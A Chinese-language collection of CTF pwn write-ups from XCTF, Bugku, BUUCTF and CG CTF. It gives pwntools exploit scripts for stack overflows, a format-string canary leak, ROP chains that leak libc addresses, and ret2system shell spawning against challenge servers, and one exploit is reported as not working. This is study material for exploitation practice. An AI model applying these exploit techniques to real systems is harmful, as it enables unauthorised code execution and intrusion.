# pwn

## 攻防世界高手进阶区

### 1.dice_game

![](截图\1.1.png)

![](截图\1.2.png)

![](截图\1.3.png)

1. 分析发现需要输入50次，而且每次必须与产生的随机数相等，过后调用sub_B28函数输出flag

![](截图\1.4.png)

2. 想到先利用输入，通过buf覆盖0x40覆盖seed()，将srand()函数的种子seed()覆盖，产生的随机数就是确定的，随后模拟50次的随机数操作拿到flag

**exp**

```python
#coding:utf8
from pwn import *
from ctypes import * #c函数库，利用rand需要
p=remote('111.198.29.45','54630')
libc = cdll.LoadLibrary("/root/libc.so.6")
#加载相对应版本libc，不同版本rand函数效果可能不同
#elf = ELF('/root/libc.so.6')
#libc = elf.libc
payload = "a" * 0x40 + p32(0)
p.sendline(payload)

for i in range(50):
    r = libc.rand() % 6 + 1
    p.sendline(str(r))
p.interactive()
```

3. 执行结果

![](截图\1.5.png)

![](截图\1.6.png)

### 2.forgot

![](截图\2.2.png)

![](截图\2.3.png)

1. 分析题目发现函数在进行一系列的操作后到此处，调用函数返回字符串

![](截图\2.4.png)

2. 接着找到函数system，发现cat flag，想到利用v3地址覆盖为system拿到flag

![](截图\2.1png.png)

3. 在输入v2时进行覆盖，v2与v3偏移32

**exp**

```python
from pwn import *
p = remote('111.198.29.45','30929')
payload = "B" * 32 + p64(0x080486cc)

p.recvuntil('>')
p.sendline('a')
p.recvuntil('>')
p.sendline(payload)
p.interactive()
```

4. 执行结果

![](截图\2.5.png)

### 3.Mary_Morton

![](截图\3.1.png)

1. 开启了Canary和NX

![](截图\3.2.png)

![](截图\3.3.png)

![](截图\3.4.png)

2. 分析题目发现输入2进入函数有字符串漏洞，输入1进入函数有栈溢出漏洞

![](截图\3.8.png)

3. 找到后门函数

![](截图\3.9.png)

4. 在函数sub_4008EB内发现了Canary保护机制，想到先使用字符串漏洞弄出Canary的值，再使用栈溢出漏洞返回到后门函数处拿到flag

![](截图\3.5.png)

5. 发现输入字符串偏移6个字节

![](截图\3.6.png)

6. 计算Canary和输入字符之间的偏移为23个字节：0x90-0x08=0x88   0x88/8=17   17+6=23

**exp**

```python
from pwn import *
p = remote('111.198.29.45','53957')

p.recvuntil("3. Exit the battle ")
p.sendline('2')
p.sendline('%23$p')
p.recvuntil('0x')

canary = int(p.recv(),16)
payload = "a" * 0x88 + p64(canary) + 'a' * 8 + p64(0x4008da)

p.recvuntil("3. Exit the battle ")
p.sendline('1')
p.sendline(payload)

p.interactive()
```

7. 执行结果

![](截图\3.7.png)

### 4.warmup

![](截图\11.1.jpg)

![](截图\11.2.jpg)

题目没给附件，看大佬exp说是fuzz，用他的exp搞不出flag，就用别人的题看了以下，gets函数溢出到后门0x40060d即可，溢出0x40+8

**exp**

```python
from pwn import *
p = remote('111.198.29.45', 39368)
payload = "a" * 0x40 + "a" * 8 + p64(0x40060d)
p.recvuntil('>')
p.sendline(payload)
p.interactive()
```

![](截图\11.3.png)

### 5.stack2

![](截图\12.1.png)

1. 分析题目，几个函数嵌套实现输入数字，改变数字等的效果，再主函数发现溢出漏洞，数组可能越界，我们可以修改数组以及数组后面的任何数据。

![](截图\12.2.png)

![](截图\12.6.png)

2. 找到后门，但是这个/bin/bash不能使用，是个坑，环境只给了sh，那就使用sh，sh是第8个元素，即command[7]，所以sh_addr就是0x08048457

![](截图\12.3.png)

![](截图\12.4.png)

3. 分析得知，利用数组越界，将主函数的返回值改成我们需要前往的地址即可，计算主函数返回位置距离数组的偏移为多少，在漏洞处下断点，调试运行，得到EBP地址(栈基地址)，再单步运行到函数结束，找到栈顶地址，偏移值0xFFCF124C-0xFFCF11C8 = 0x84

**exp**

地址为小端存储，而且是char型(一个字节)

```python
from pwn import *
p = remote('111.198.29.45','30125')

offset = 0x84
system_addr = [0x50,0X84,0X04,0X08]
sh_addr = [0x87,0X89,0X04,0X08]

p.sendlineafter("you have:",'1')
p.sendlineafter("your numbers",'1')
p.recvuntil("5. exit")

def change(offset,value):
	p.sendline('3')
   	p.sendlineafter("which number to change:",str(offset))
   	p.sendlineafter("new number:",str(value))
   	p.recvuntil("5. exit")

for i in range(4):
	change(offset+i,system_addr[i])
offset += 8
for i in range(4):
	change(offset+i,sh_addr[i])

p.sendline('5')
p.interactive()
```

4. 执行结果

![](截图\12.5.png)

### 6.monkey

![](截图\13.1.png)

一个C语言框架的js执行，框架内有函数os.system()，直接远程连接执行"/bin/sh"  cat flag即可

### 7.pwn1

![](截图\14.5.png)

1. 查保护，开了三个

![](截图\14.1.png)

2. 分析题目，发现read函数存在溢出，程序没有后门，需要从libc中找，构造ROP

![](截图\14.2.png)

![](截图\14.3.png)

3. 发现Canary保护点，v8内存放Canary，计算偏移0x90-0x8 = 0x88，我们填充0x88字符可将Canary地址带出

![](截图\14.7.png)

![](截图\14.4.png)

4. ROPgadget求rdi地址，one_gadget求libc中后门地址，就是直接执行 execve('/bin/sh', NULL, NULL)，四个选一个就行，想用bin_sh_in_libc = next(libc.search('/bin/sh'))  但得到的地址是错的，遗留问题

**exp**

利用puts函数泄露Canary地址，再泄露puts真正地址，求得libc基地址

```python
# coding=utf-8
from pwn import *
p = remote('111.198.29.45','46377')
elf = ELF('/root/桌面/babystack')
libc = ELF('/root/桌面/libc-2.23.so')

pop_rdi = 0x0400a93
got_puts = elf.got['puts']
plt_puts = elf.plt['puts']
main_addr = 0x0400908
bin_sh_in_libc = 0x45216

#求Canary地址
p.sendlineafter(">> ",'1')
payload = 'a'*0x88
p.sendline(payload)
p.sendlineafter(">> ",'2')
p.recvuntil('a'*0x88+'\n')
Canary_addr = u64(p.recv(7).rjust(8,'\x00'))

#求puts真正地址
p.sendlineafter(">> ",'1')
payload2 ='a'*0x88+p64(Canary_addr)+'a'*8+p64(pop_rdi)+p64(got_puts)+p64(plt_puts)+p64(main_addr)
p.sendline(payload2)
p.recv()
p.sendlineafter('>> ','3')
puts_addr = u64(p.recv(8).ljust(8,'\x00'))

#求libc基地址，/bin/sh地址
libcbase = puts_addr - libc.symbols['puts']
bin_sh_addr = bin_sh_in_libc + libcbase
p.sendlineafter(">> ",'1')
payload3 = 'a'*0x88+p64(Canary_addr)+'a'*8+p64(bin_sh_addr)
p.sendline(payload3)
p.sendlineafter(">> ",'3')
#p.sendline("ls")
#p.sendline("cat flag")
p.interactive()
```



![](截图\14.6.png)

## 攻防世界新手练习区

太菜了，做不动，做点新手题练一练

### 1.level2

![](截图\17.2.png)

1. read函数溢出

![](截图\17.1.png)

![](截图\17.3.png)

2. 找到system函数地址和'/bin/sh'地址，构造ROP

**exp**

payload：0x88缓冲区，0x4覆盖ebp，然后system地址，返回地址，参数地址

```python
from pwn import *
p = remote('111.198.29.45','34109')
bin_sh_addr = 0x804a024
system_addr = 0x8048320
payload = "a"*0x88+"a"*4+p32(system_addr)+"aaaa"+p32(bin_sh_addr)
p.sendline(payload)
p.interactive()
```

3. 执行结果

![](截图\17.4.png)

### 2.hello_pwn

![](截图\18.2.png)

![](截图\18.1.png)

溢出覆盖，差0x4个字节，再加赋值

**exp**

```python
from pwn import*
p =remote('111.198.29.45','59680')
payload = "a"*0x4+p64(0x6E756161)
p.sendline(payload)
p.interactive()
```

执行结果

![](截图\18.3.png)

### 3.when_did_you_born

![](截图\19.1.png)

gets处让v4溢出覆盖到v5，赋值给0x786

**exp**

```python
from pwn import*
p = remote('111.198.29.45','48691')
p.sendlineafter("Birth?",'2000')
p.sendlineafter("Name","a"*8+p64(0x786))
p.interactive()
```

执行结果

![](截图\19.2.png)

### 4.CGfsb

![](截图\20.1.png)

1. 发现只要让pwnme变为8即可得到flag，利用s将pwnme地址输入并赋值8

![](截图\20.2.png)

2. 利用printf函数查出输入字符的偏移为10

**exp**

%n可以%n 之前打印出来的字符 个数，赋值给一个变量，%10$n将之前打印字符个数放进指定的偏移10的地方（pwnme地址加四个a正好为8）

```python
from pwn import *
p = remote('111.198.29.45', 36275)
pwnme_addr = 0x804A068           
p.sendlineafter("name:\n",'aaa')
payload = p32(pwnme_addr)+'aaaa'+'%10$n'     
p.sendlineafter("please:\n",payload)
p.interactive()
```

3. 执行结果

![](截图\20.3.png)

### 5.get_shell

![](截图\21.1.png)

### 6.guess_num

![](截图\22.1.png)

1. 发现只要在gets处进行溢出将seed覆盖为我们想要的值，就可以拿到flag，0x30-0x10=0x20

![](截图\22.2.png)

2. 查libc

**exp**

```python
from pwn import *
from ctypes import *
p = remote('111.198.29.45','59354')
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
#elf = ELF('/root/桌面/guess_num')
#libc = elf.libc
payload = "a"*0x20+p64(0)
p.sendline(payload)
libc.srand(1)
for i in range(10):
    r = str(libc.rand()%6+1)
    p.sendline(r)
p.interactive()
```

3. 执行结果

![](截图\22.3.png)

## bugku

### 1.pwn4

![](截图\4.1.png)

1. 分析题目，发现明显的read()函数栈溢出漏洞

![](截图\4.2.png)

![](截图\4.3.png)

![](截图\4.5.png)

2. 找到system后门，但是无法使用，查找中发现$0，通过栈溢出覆盖到$0处让其成为system的参数就能调用后门

![](截图\4.4.png)

3. 32位的程序函数是使用栈来传递参数，64位的程序函数是使用寄存器来传递参数，前几个参数的顺序分别为 rdi, rsi, rdx, rcx, r8, r9，这个程序是64位，所以我们要去找pop rdi的地址，将要传递的参数放在pop rdi下方，执行pop rdi时，就将栈顶的值赋给了rdi，也就是rdi = '/bin/sh'       [栈溢出中64位程序的处理方法](https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=46410&fromuid=446141)

**exp**

4. 0x10+8覆盖rbp，$0存入rdi作为system的参数，传入system调用

```python
from pwn import *
context.log_level = 'debug'
p = process('/root/pwn4')
#p = remote('114.116.54.89','10004')
system = 0x40075A
bash = 0x60111f
pop_rdi = 0x4007d1
payload = "a" * 0x10 + "a" * 8 + p64(pop_rdi) + p64(bash) + p64(system)
p.recvuntil("Come on,try to pwn me")
p.sendline(payload)
p.interactive()

```

## BUUCTF

### 1.test_your_nc

![](截图\5.1.png)

![](截图\5.2.png)

nc + ls + cat flag即可拿到flag

### 2.rip

![](截图\6.1.png)

1. gets函数存在溢出

![](截图\6.2.png)

2. 找到后门，想到利用溢出覆盖到rip利用后门

![](截图\6.3.png)

3. peda算出rip偏移23

**exp**

```python
from pwn import *
p = remote('node3.buuoj.cn','29938')
payload = "a" * 23 + p64(0x40118A)
p.sendline(payload)
p.interactive()
```

4. 执行结果

![](截图\6.4.png)

![](截图\6.5.png)

### 3.warmup_csaw_2016



![](截图\7.1.png)![](截图\7.2.png)

1. 分析题目发现溢出点和后门，类比上题

![](截图\7.3.png)

2. peda查偏移

**exp**

```python
from pwn import *
p = remote('node3.buuoj.cn','25379')
payload = "a" * 72 + p64(0x400611)
p.sendline(payload)
p.interactive()
```

3. 执行结果

![](截图\7.4.png)

### 4.pwn1_sctf_2016

![](截图\8.1.png)

1. 分析主函数，fgets处限制了输入s最多32字节，但在strcpy处没有限制

![](截图\8.2.png)

![](截图\8.3.png)

2. 经过测试发现程序会将输入的 大写字母I 转换为字符串you，也就是说一个字节变成了三个字节，在strcpy处v0的长度变为了原来的三倍，最多输入32个大写字母 I，vo长度为32*3=96远远大于0x3C，可以进行栈溢出，也就是0x3C + 4(32位，ebp) = 64    也就是21个大写字母 I 加一个 a

**exp**

```python
from pwn import *
p = remote('node3.buuoj.cn','25779')
payload = "a" + "I" * 21 + p32(0x08048F13)
p.sendline(payload)
p.interactive()
```

3. 执行结果

![](截图\8.4.png)



### 5.ciscn_2019_n_1

![](截图\9.1.png)

1. 分析题目，gets处存在溢出，使用v1覆盖v2调用system拿到flag

![](截图\9.2.png)

![](截图\9.3.png)

2. 找到11.28125地址0x348000，偏移0x30-0x4=0x2C

**exp**

```python
from pwn import *
p = remote('node3.buuoj.cn','27913')
payload = "a" * 0x2c + p64(0x41348000)
p.sendline(payload)
p.interactive()
```

3. 执行结果

![](截图\9.4.png)

### 6.ciscn_2019_c_1（未完成）

![](截图\10.1.png)

![](截图\10.2.png)

1. encrypt函数中发现gets处存在漏洞，但并未发现有后门函数可以利用，想到利用溢出到puts函数以达到泄露gets函数地址的目的，构造ROP链执行system即可 [NX机制及绕过策略-ROP](https://www.jianshu.com/p/f3ebf8a360f0) 

![](截图\10.3.png)

**exp**

偏移=rsp+0x50=0x58

```python
from pwn import *
p = remote('node3.buuoj.cn','25483')
#p = process('/root/ciscn_2019_c_1')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #/root/libc.so.6
elf = ELF('/root/ciscn_2019_c_1')

plt_puts = elf.plt['puts']
got_puts = elf.got['puts']
main = elf.symbols['main']
pop_rid = 0x400c83

payload = "A" * 0x58 
payload += p64(pop_rid) 
payload += p64(got_puts) 
payload += p64(plt_puts) 
payload += p64(main)
p.recvuntil('Input your choice!\n')
p.sendline('1')
p.recvuntil('Input your Plaintext to be encrypted\n')
p.sendline(payload)

p.recvuntil('@\n')
gets_addr = u64(p.recv(6).ljust(8,'\0'))
libcbase = gets_addr - libc.symbols['puts']#拿到libc基地址

system_in_libc = libc.symbols['system']#system在libc文件里的偏移地址
bin_sh_in_libc = next(libc.search('/bin/sh'))#/'bin/sh'字符串在libc里的偏移地址

system_addr = libcbase + system_in_libc#system在程序里的地址
bin_sh_addr = libcbase + bin_sh_in_libc#/bin/sh在程序里的地址

payload2 = "A" * 0x58
payload2 += p64(pop_rid)
payload2 += p64(bin_sh_addr)
payload2 += p64(system_addr)

p.recvuntil('Input your choice!\n')
p.sendline('1')
p.recvuntil('Input your Plaintext to be encrypted\n')
p.sendline(payload2)
p.interactive()
```

远程连接不上，看大佬exp说是调用栈要对齐，最后payload要加一个ret保证栈堆平衡，但尝试无果，用了好多大佬的exp也没搞到flag

学到操作

```python
p.recvuntil('@\n')
gets_addr = u64(p.recv(6).ljust(8,'\0'))
libcbase = gets_addr - libc.symbols['puts']#拿到libc基地址
```

### 7.[OGeek2019]babyrop

![](截图\16.1.png)

![](截图\16.2.png)

1. 对用户输入进行比较，/dev/random和/dev/urandom是Linux系统中提供的随机伪设备，提供永不为空的随机字节数据流，strlen函数遇到\x00就会终止，只要输入开头为\x00即可绕过strncmp函数

![](截图\16.3.png)

2. read函数第三个参数实际上为前一个函数的返回值，可以通过上一次输入\xff，就可利用栈溢出进行ROP

**exp**

payload：越过strncmp函数并溢出

payload2：跳转到write(plt)，构造参数打印got表中地址

payload3：溢出system函数加载地址，设置'/bin/sh'地址为参数，"a"*4为返回地址（随意即可，也可用p32(libc.symbols['exit'])）

[rop链攻击原理与思路(x86/x64)](https://bbs.pediy.com/thread-257238.htm)

```python
# coding=utf-8
from pwn import *
p = remote('node3.buuoj.cn',27126)
libc = ELF("/root/桌面/libc-2.23.so")
elf = ELF("/root/桌面/pwn")

offset = 0xE7
main_addr = 0x8048825
got_write = elf.got['write']
plt_write = elf.plt['write']
system_in_libc = libc.symbols['system']
bin_sh_in_libc = next(libc.search('/bin/sh'))

payload = "\x00"+"\xff"*7
p.sendline(payload)
p.recvuntil("Correct\n")

payload2 = "a"*(offset+4)+p32(plt_write)+p32(main_addr)+p32(1)+p32(got_write)
p.sendline(payload2)
write_addr = u32(p.recv(4))

libcbase = write_addr-libc.symbols['write']
system_addr = libcbase+system_in_libc
bin_sh_addr = libcbase+bin_sh_in_libc

payload3 = "a"*(offset+4)+p32(system_addr)+"a"*4+p32(bin_sh_addr)
p.sendline(payload)
p.sendlineafter("Correct\n",payload3)
p.interactive()
```

3. 执行结果

![](截图\16.4.png)

## CG CTF

### 1.Stack Overflow

![](截图\15.1.png)

![](截图\15.2.png)

1. 发现溢出点A，n对s有限制，但可以通过A溢出覆盖到n

![](截图\15.3.png)

2. 没有后门/bin/sh，但有system函数，想到第一次溢出到n写入'/bin/sh'，第二次输出时再次溢出，返回地址覆盖成system地址，并且让system的参数为n的地址

**exp**

输入s到返回地址为0x34，"a"*4是因为每个函数在call时，堆栈的栈顶是返回地址，所以这里随便用4个"a"充当返回地址

```python
# coding=utf-8
from pwn import *
p = remote('182.254.217.142','10001')
elf = ELF('/root/桌面/cgpwna')
system_addr = elf.symbols['system']
bin_sh_addr = 0x804a0a8

payload = "a"*40+'/bin/sh'
p.sendlineafter("your choice:",'1')
p.sendlineafter("here:",payload)

payload2 = "a"*0x34+p32(system_addr)+"a"*4+p32(bin_sh_addr)
p.sendlineafter("please:",payload2)
p.interactive()

```

3. 执行结果

![](截图\15.4.png)